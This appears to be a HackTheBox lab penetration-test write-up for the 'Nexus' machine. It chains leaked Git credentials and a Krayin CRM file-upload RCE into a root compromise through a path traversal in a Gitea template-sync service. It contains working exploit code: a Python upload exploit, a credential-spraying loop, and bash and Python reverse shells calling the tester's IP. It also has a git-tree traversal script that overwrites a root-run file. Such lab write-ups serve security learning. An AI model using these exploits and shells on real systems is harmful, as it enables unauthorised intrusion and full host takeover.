# Penetration Test Report — Nexus (HackTheBox)

**Target:** 10.129.234.54  
**Date:** 2026-08-21  
**Tester IP:** 10.10.16.35  
**Status:** Fully compromised (user + root)

---

## 1. Executive Summary

A penetration test was conducted against the target host 10.129.234.54 (nexus.htb). Through a combination of subdomain enumeration, source code analysis of a public Git repository, and exploitation of a known authenticated Remote Code Execution vulnerability in Krayin CRM v2.2.0, initial access was obtained as `www-data`. Lateral movement to the `jones` user was achieved via password reuse discovered in the production `.env` file. Privilege escalation to `root` was accomplished by exploiting a path traversal vulnerability in a custom Gitea template synchronization service running as root via systemd timer.

| Flag | Value |
|------|-------|
| user.txt | `[REDACTED]` |
| root.txt | `[REDACTED]` |

---

## 2. Scope

| Asset              | Detail              |
|--------------------|----------------------|
| Target IP          | 10.129.234.54        |
| Primary Domain     | nexus.htb            |
| Virtual Hosts      | git.nexus.htb, billing.nexus.htb |
| Open Ports         | 22 (SSH), 80 (HTTP)  |

---

## 3. Reconnaissance

### 3.1 Port Scan

**Command:**
```bash
nmap -sV 10.129.234.54
```

**Results:**

| Port | State | Service | Version                              |
|------|-------|---------|--------------------------------------|
| 22   | open  | SSH     | OpenSSH 9.6p1 Ubuntu 3ubuntu13.16    |
| 80   | open  | HTTP    | nginx 1.24.0 (Ubuntu)                |

### 3.2 Hostname Discovery

An HTTP request to the target IP returned a **302 redirect** to `http://nexus.htb/`, revealing the hostname.

```bash
curl -I http://10.129.234.54
# Location: http://nexus.htb/
```

### 3.3 Virtual Host Enumeration

**Command:**
```bash
ffuf -u http://nexus.htb -H "Host: FUZZ.nexus.htb" \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -ac
```

**Results:**

| Subdomain | Full Hostname       |
|-----------|---------------------|
| git       | git.nexus.htb       |
| billing   | billing.nexus.htb   |

All three hostnames were added to `/etc/hosts`:
```
10.129.234.54 nexus.htb git.nexus.htb billing.nexus.htb
```

---

## 4. Enumeration

### 4.1 nexus.htb — Corporate Website

A static corporate website for "Nexus Energy Authority" running on nginx 1.24.0. The site contained a job posting with the following email addresses:

| Name       | Email                   | Role             |
|------------|-------------------------|------------------|
| Careers    | careers@nexus.htb       | General hiring   |
| J. Matthew | j.matthew@nexus.htb     | Hiring manager   |

### 4.2 git.nexus.htb — Gitea 1.26.0

A self-hosted Gitea instance (version 1.26.0) with public explore pages enabled.

**Users:**

| Username | Joined     |
|----------|------------|
| admin    | 2026-04-23 |
| jones    | 2026-05-11 |

**Public Repositories:**

| Owner | Repository           | Last Updated |
|-------|----------------------|--------------|
| admin | krayin-docker-setup  | 2026-04-23   |

### 4.3 billing.nexus.htb — Krayin CRM 2.2.0

A Krayin CRM instance (Laravel-based) with the following notable characteristics:

| Finding                         | Detail                                        |
|---------------------------------|-----------------------------------------------|
| Application                     | Krayin CRM v2.2.0                             |
| Framework                       | Laravel 12 / PHP 8.3.6                        |
| Login page                      | /admin/login                                  |
| APP_DEBUG                       | true                                          |
| Laravel Debug Bar                | Enabled (/_debugbar/open)                     |
| Laravel Ignition                | Active, can_execute_commands: true             |
| Ignition health-check           | /_ignition/health-check                       |

**Directory brute-force results (dirsearch):**

| Path                            | Status | Notes                           |
|---------------------------------|--------|---------------------------------|
| /admin/login                    | 200    | Login page                      |
| /_debugbar/open                 | 200    | Debug Bar (storage closed)      |
| /_ignition/execute-solution     | 405    | Ignition endpoint (POST only)   |
| /_ignition/health-check         | 200    | Returns can_execute_commands    |
| /storage/                       | 403    | Storage directory               |
| /robots.txt                     | 200    | Empty disallow                  |
| /web.config                     | 200    | IIS rewrite rules               |
| /installer/                     | 301    | Installer directory             |

---

## 5. Credential Discovery

### 5.1 Git History Analysis

The public repository `admin/krayin-docker-setup` was cloned and inspected:

```bash
git clone http://git.nexus.htb/admin/krayin-docker-setup.git /tmp/krayin-docker-setup
git -C /tmp/krayin-docker-setup log --all --oneline
```

```
9b817fa Upload files to "/"
1615c46 Upload files to "/"
```

A diff between the two commits revealed a database password that was removed in the latest commit:

```bash
git -C /tmp/krayin-docker-setup diff 1615c46 9b817fa
```

```diff
-DB_PASSWORD=[REDACTED]
+DB_PASSWORD=
```

### 5.2 Credential Summary

| Source       | Field       | Value                |
|--------------|-------------|----------------------|
| Git history  | DB_PASSWORD | [REDACTED]        |
| Git history  | DB_USERNAME | krayin               |
| Git history  | DB_DATABASE | krayin               |
| .env file    | IMAP_HOST   | imap.nexus.htb       |
| .env file    | IMAP_USER   | username1 (placeholder) |

### 5.3 Authentication to Krayin CRM

The leaked password was tested against the CRM login page with multiple email addresses:

```bash
for email in admin@example.com admin@krayin.com admin@billing.nexus.htb \
             j.matthew@nexus.htb jones@nexus.htb; do
  TOKEN=$(curl -s -c /tmp/kc_$$.txt http://billing.nexus.htb/admin/login \
    | grep -oP 'name="_token" value="\K[^"]+')
  RESULT=$(curl -s -b /tmp/kc_$$.txt -o /dev/null -w '%{redirect_url}' \
    -X POST -d "_token=$TOKEN&email=$email&password=[REDACTED]" \
    http://billing.nexus.htb/admin/login)
  echo "$email -> $RESULT"
done
```

**Results:**

| Email                       | Redirect                              | Status  |
|-----------------------------|---------------------------------------|---------|
| admin@example.com           | /admin/login                          | Failed  |
| admin@krayin.com            | /admin/login                          | Failed  |
| admin@billing.nexus.htb     | /admin/login                          | Failed  |
| **j.matthew@nexus.htb**     | **/admin/dashboard**                  | **Success** |
| jones@nexus.htb             | /admin/login                          | Failed  |

**Valid credentials:** `j.matthew@nexus.htb` / `[REDACTED]`

---

## 6. Exploitation — CVE-2026-38526 (Authenticated RCE)

### 6.1 Vulnerability Details

| Field           | Detail                                                |
|-----------------|-------------------------------------------------------|
| CVE             | CVE-2026-38526                                        |
| Type            | Arbitrary Code Injection (Remote Code Execution)      |
| Severity        | High (CVSS 8.7)                                       |
| Affected        | Krayin CRM >= 2.2.0 (no fix available)                |
| Endpoint        | /admin/tinymce/upload                                 |
| Auth required   | Yes (low-privilege authenticated user)                |
| Exploit DB      | EDB-52629                                             |
| Disclosed       | 2026-04-14                                            |

**Description:** The `/admin/tinymce/upload` endpoint does not properly validate uploaded file types. An authenticated attacker can upload a crafted PHP file disguised as an image, achieving remote code execution on the server.

### 6.2 Proof of Concept — PHP Reverse Shell

**shell.php:**
```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.16.35/4444 0>&1'"); ?>
```

### 6.3 Proof of Concept — Exploit Script

**exploit_krayin.py:**
```python
import asyncio
import httpx
from urllib.parse import urljoin, unquote
from bs4 import BeautifulSoup

async def main():
    url = "http://billing.nexus.htb"
    user = "j.matthew@nexus.htb"
    password = "[REDACTED]"
    file_path = "/tmp/shell.php"

    async with httpx.AsyncClient(verify=False, follow_redirects=False) as client:
        url_login = urljoin(url, "/admin/login")
        upload_url = urljoin(url, "/admin/tinymce/upload")

        get_tokens = await client.get(url=url_login)
        soup = BeautifulSoup(get_tokens.text, 'html.parser')
        _token = soup.find('input').get('value')

        login_data = {
            "_token": _token,
            "email": user,
            "password": password
        }

        login_r = await client.post(url=url_login, data=login_data)
        xsrf_token = login_r.cookies.get("XSRF-TOKEN")
        headers = {
            "X-XSRF-TOKEN": unquote(xsrf_token)
        }

        with open(file_path, 'rb') as o_file:
            r = await client.post(
                url=upload_url,
                files={"file": (o_file.name, o_file, "image/jpeg")},
                headers=headers
            )
            if r.status_code == 200:
                exploit_url = r.json().get('location')
                print(f'[+] File uploaded successfully.\nPath to file: {exploit_url}')
            else:
                print(f'[-] File not uploaded. Status: {r.status_code}')
                print(r.text)

if __name__ == '__main__':
    asyncio.run(main())
```

### 6.4 Exploitation Steps

1. **Start listener** on attacker machine:
   ```bash
   nc -lvnp 4444
   ```

2. **Run exploit** to upload the PHP reverse shell:
   ```bash
   python3 /tmp/exploit_krayin.py
   ```
   ```
   [+] File uploaded successfully.
   Path to file: http://billing.nexus.htb/storage/tinymce/081519014b3e6f365cb14af92d9c843c.php
   ```

3. **Trigger the shell** by requesting the uploaded file:
   ```bash
   curl http://billing.nexus.htb/storage/tinymce/081519014b3e6f365cb14af92d9c843c.php
   ```

4. **Reverse shell received** on the listener (port 4444).

---

## 7. Lateral Movement — Password Reuse (www-data → jones)

### 7.1 Production .env Discovery

After obtaining a shell as `www-data`, the production `.env` file at `/var/www/krayin/.env` was read, revealing a different database password than the one found in git history:

```bash
cat /var/www/krayin/.env | grep DB_PASSWORD
# DB_PASSWORD=[REDACTED]
```

### 7.2 Database Enumeration

```bash
mysql -u krayin -p'[REDACTED]' -h 127.0.0.1 krayin -e "select name, password from users;"
```

```
+-------+--------------------------------------------------------------+
| name  | password                                                     |
+-------+--------------------------------------------------------------+
| james | [REDACTED] |
+-------+--------------------------------------------------------------+
```

### 7.3 Credential Reuse — su to jones

The production database password was reused as the system password for the `jones` user:

```bash
su jones
# Password: [REDACTED]
jones@nexus:~$ cat ~/user.txt
[REDACTED]
```

### 7.4 Updated Credential Table

| Source          | Username | Password          | Access                  |
|-----------------|----------|-------------------|-------------------------|
| Git history     | krayin   | [REDACTED]     | CRM login (j.matthew)   |
| Production .env | krayin   | [REDACTED]   | MySQL + su jones         |

---

## 8. Privilege Escalation — Gitea Template Sync Path Traversal (jones → root)

### 8.1 Discovery

Enumeration of systemd timers revealed a custom service running every 60 seconds as root:

```bash
systemctl list-timers --all | grep gitea
# gitea-template-sync.timer  loaded active waiting  Run Gitea template sync every minute

systemctl cat gitea-template-sync.service
```

```ini
[Unit]
Description=Sync Gitea templates
After=network-online.target

[Service]
Type=oneshot
User=root
ExecStart=/usr/bin/python3 /etc/gitea/template-sync.py
TimeoutStartSec=50s
```

### 8.2 Vulnerability Analysis

The script `/etc/gitea/template-sync.py` (owned by `git:git`, readable by all):

1. Authenticates to the Gitea API using a token from `/etc/gitea/template-sync.conf`
2. Queries for all repositories marked as **templates**
3. Runs `git ls-tree -r HEAD` on each template repo's bare repository
4. Extracts each file to `/home/git/template-staging/{owner}/{repo}/{filepath}`
5. **Does not sanitize `filepath`** — path traversal via `../` in git tree entries allows arbitrary file writes as root

Key vulnerable code:
```python
target = os.path.join(stage_path, filepath)  # No sanitization of filepath!
with open(target, 'wb') as f:
    f.write(cat_result.stdout)
```

### 8.3 Exploitation Strategy

Since `jones` is a Gitea user, we can:
1. Create a template repository via the Gitea API
2. Craft a git tree with `../` traversal in filenames using low-level git commands
3. Push the malicious tree to the template repo
4. Wait for the timer to fire — the script writes our payload as root
5. Target: overwrite `/etc/gitea/template-sync.py` with a reverse shell so the next execution gives us a root shell

Staging path: `/home/git/template-staging/jones/template-test/`  
Target path: `/etc/gitea/template-sync.py`  
Required traversal: `../../../../../etc/gitea/template-sync.py` (5 levels up to `/`)

### 8.4 Proof of Concept — Gitea API Token & Template Repo Creation

```bash
# Create API token for jones
curl -s -u 'jones:[REDACTED]' \
  -X POST -H 'Content-Type: application/json' \
  -d '{"name":"exploit","scopes":["all"]}' \
  http://git.nexus.htb/api/v1/users/jones/tokens

# Response: {"id":2,"name":"exploit","sha1":"7267e8fd5c5ace83c19c6c27f9462f5d36caae9d",...}

# Create template repository
curl -s -H 'Authorization: token [REDACTED]' \
  -H 'Content-Type: application/json' \
  -X POST -d '{"name":"template-test","template":true,"auto_init":true,"default_branch":"main"}' \
  http://git.nexus.htb/api/v1/user/repos
```

### 8.5 Proof of Concept — Path Traversal via Git Tree Manipulation

**build_traversal.sh:**
```bash
#!/bin/bash
set -e
REPO="/tmp/template-test"

# Clone the template repo
git clone http://jones:[REDACTED]@git.nexus.htb/jones/template-test.git "$REPO"

# Create reverse shell payload as a git blob
BLOB=$(printf 'import os,pty,socket\ns=socket.socket()\ns.connect(("10.10.16.35",4444))\n[os.dup2(s.fileno(),fd) for fd in (0,1,2)]\npty.spawn("/bin/bash")\n' | git -C "$REPO" hash-object -w --stdin)
echo "BLOB = $BLOB"

# Build nested git tree structure with path traversal:
# .. / .. / .. / .. / .. / etc / gitea / template-sync.py
#
# This creates the filepath: ../../../../../etc/gitea/template-sync.py
# Which resolves from /home/git/template-staging/jones/template-test/ to /etc/gitea/template-sync.py

T1=$(printf '100755 blob %s\ttemplate-sync.py\n' "$BLOB" | git -C "$REPO" mktree)
T2=$(printf '040000 tree %s\tgitea\n' "$T1" | git -C "$REPO" mktree)
T3=$(printf '040000 tree %s\tetc\n' "$T2" | git -C "$REPO" mktree)

# 5 levels of .. (to traverse from staging dir to /)
T4=$(printf '040000 tree %s\t..\n' "$T3" | git -C "$REPO" mktree)
T5=$(printf '040000 tree %s\t..\n' "$T4" | git -C "$REPO" mktree)
T6=$(printf '040000 tree %s\t..\n' "$T5" | git -C "$REPO" mktree)
T7=$(printf '040000 tree %s\t..\n' "$T6" | git -C "$REPO" mktree)
FINAL=$(printf '040000 tree %s\t..\n' "$T7" | git -C "$REPO" mktree)
echo "FINAL = $FINAL"

# Create commit with the malicious tree and push
COMMIT=$(git -C "$REPO" commit-tree "$FINAL" -m "update" -p HEAD)
git -C "$REPO" update-ref refs/heads/main "$COMMIT"
git -C "$REPO" push origin main --force
echo "Pushed!"
```

### 8.6 Exploitation Steps

1. **Start listener** on attacker machine:
   ```bash
   nc -lvnp 4444
   ```

2. **Run the traversal script** to push the malicious tree:
   ```bash
   bash /tmp/build_traversal.sh
   ```
   ```
   BLOB = [REDACTED]
   FINAL = [REDACTED]
   Pushed!
   ```

3. **Wait ~60-120 seconds** — the template-sync timer fires:
   - First execution: syncs the template, writes the reverse shell to `/etc/gitea/template-sync.py`
   - Second execution: runs the overwritten `template-sync.py` as root, triggering the reverse shell

4. **Root shell received:**
   ```
   connect to [10.10.16.35] from (UNKNOWN) [10.129.234.54] 60514
   root@nexus:/# cat /root/root.txt
   [REDACTED]
   ```

---

## 9. Attack Chain Summary

```
Nmap scan (ports 22, 80)
  └─> Hostname discovery (nexus.htb via 302 redirect)
      └─> VHost enumeration (git.nexus.htb, billing.nexus.htb)
          ├─> Gitea 1.26.0 exploration
          │     ├─> Users: admin, jones
          │     └─> Public repo: admin/krayin-docker-setup
          │           └─> Git diff reveals DB password: [REDACTED]
          ├─> billing.nexus.htb enumeration
          │     ├─> Krayin CRM v2.2.0 identified
          │     ├─> Debug Bar & Ignition exposed
          │     └─> Login with j.matthew@nexus.htb / [REDACTED]
          └─> CVE-2026-38526 (TinyMCE upload RCE)
                └─> Reverse shell as www-data
                      └─> Production .env: DB_PASSWORD=[REDACTED]
                            ├─> MySQL enum: user "james" bcrypt hash
                            └─> su jones (password reuse) → user.txt
                                  └─> Gitea template-sync path traversal
                                        └─> Overwrite template-sync.py with rev shell
                                              └─> Root shell → root.txt
```

---

## 10. Additional Vulnerabilities Identified (Not Exploited)

The following vulnerabilities affect Krayin CRM 2.2.0 but were not exploited during this engagement:

| Severity | Vulnerability                              | Snyk ID                              |
|----------|--------------------------------------------|--------------------------------------|
| High     | SQL Injection                              | SNYK-PHP-KRAYINLARAVELCRM-18600662   |
| High     | Authorization Bypass (User-Controlled Key) | SNYK-PHP-KRAYINLARAVELCRM-17950717   |
| High     | Access Control Bypass                      | SNYK-PHP-KRAYINLARAVELCRM-16066687   |
| High     | Authorization Bypass (User-Controlled Key) | SNYK-PHP-KRAYINLARAVELCRM-16066684   |
| High     | Authorization Bypass (User-Controlled Key) | SNYK-PHP-KRAYINLARAVELCRM-16066663   |
| High     | Server-side Request Forgery (SSRF)         | SNYK-PHP-KRAYINLARAVELCRM-16066602   |
| High     | SQL Injection                              | SNYK-PHP-KRAYINLARAVELCRM-16066601   |
| Medium   | Cross-site Scripting (XSS)                 | SNYK-PHP-KRAYINLARAVELCRM-15907870   |

Additional misconfigurations observed:

| Issue                        | Detail                                          |
|------------------------------|--------------------------------------------------|
| APP_DEBUG enabled            | Exposes stack traces and environment variables    |
| Laravel Debug Bar public     | /_debugbar/open accessible                       |
| Laravel Ignition active      | /_ignition/health-check returns can_execute_commands: true |
| Credentials in Git history   | Database password committed and later removed     |
| IMAP credentials placeholder | .env contains placeholder IMAP creds              |

---

## 11. Recommendations

1. **Upgrade Krayin CRM** — v2.2.0 has no patch for CVE-2026-38526. Consider migrating to a patched version or implementing WAF rules to block PHP uploads.
2. **Remove sensitive data from Git** — Rotate all credentials exposed in the repository. Use `git filter-branch` or BFG Repo-Cleaner to purge secrets from history.
3. **Disable APP_DEBUG in production** — Set `APP_DEBUG=false` and remove Debug Bar and Ignition from production deployments.
4. **Restrict file upload types** — Enforce server-side validation on the TinyMCE upload endpoint; block `.php`, `.phtml`, `.phar` extensions.
5. **Restrict Gitea access** — Disable public repository browsing or require authentication for the explore pages.
6. **Enforce strong, unique passwords** — Do not reuse database credentials across application login accounts.
7. **Implement network segmentation** — Internal services (phpMyAdmin on port 8080, MySQL) should not be accessible from the application tier without need.
8. **Sanitize file paths in template-sync.py** — Use `os.path.realpath()` and verify the resolved path starts with the intended staging directory before writing. Reject any path containing `..`.
9. **Principle of least privilege for systemd services** — The template-sync service should not run as root. Use a dedicated low-privilege user with write access only to the staging directory.
10. **Restrict template repo creation** — Only admin users should be able to mark repositories as templates, limiting the attack surface of the sync service.
